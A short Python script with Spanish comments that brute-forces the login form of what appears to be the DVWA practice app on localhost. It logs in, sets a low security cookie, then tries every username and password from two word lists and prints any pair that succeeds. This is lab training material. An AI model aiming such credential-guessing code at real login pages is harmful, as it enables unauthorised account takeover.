import requests
from bs4 import BeautifulSoup

url_login = 'http://localhost:8080/login.php'  # URL para iniciar sesión
url_brute = 'http://localhost:8080/vulnerabilities/brute/'

# Archivos de texto con usuarios y contraseñas
users_file = 'userlist.txt'
passwords_file = 'passwordlist.txt'

# Cabeceras HTTP a utilizar para la solicitud
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Datos de inicio de sesión
login_data = {
    'username': 'admin',  # Cambia esto a un usuario conocido o uno que quieras probar
    'password': 'password',  # Cambia esto a la contraseña del usuario
    'Login': 'Login'
}

def read_lines(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def get_php_session_id():
    # Realiza una solicitud POST para iniciar sesión
    response = requests.post(url_login, headers=headers, data=login_data)
    # Extrae la cookie PHPSESSID
    session_id = response.cookies.get('PHPSESSID')
    return {
        'User-Agent': headers['User-Agent'],
        'Content-Type': headers['Content-Type'],
        'Cookie': f'security=low; PHPSESSID={session_id}'
    }, session_id

def brute_force_attack(headers):
    users = read_lines(users_file)
    passwords = read_lines(passwords_file)

    for username in users:
        for password in passwords:
            data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }

            response = requests.post(url_brute, headers=headers, data=data)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Verifica el contenido de la página para encontrar el mensaje correcto
            if 'Welcome to the password protected area' in soup.get_text():
                print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
            else:
                pass

# Obtén el PHPSESSID y realiza el ataque
headers, session_id = get_php_session_id()
print(f'PHPSESSID: {session_id}')
brute_force_attack(headers)
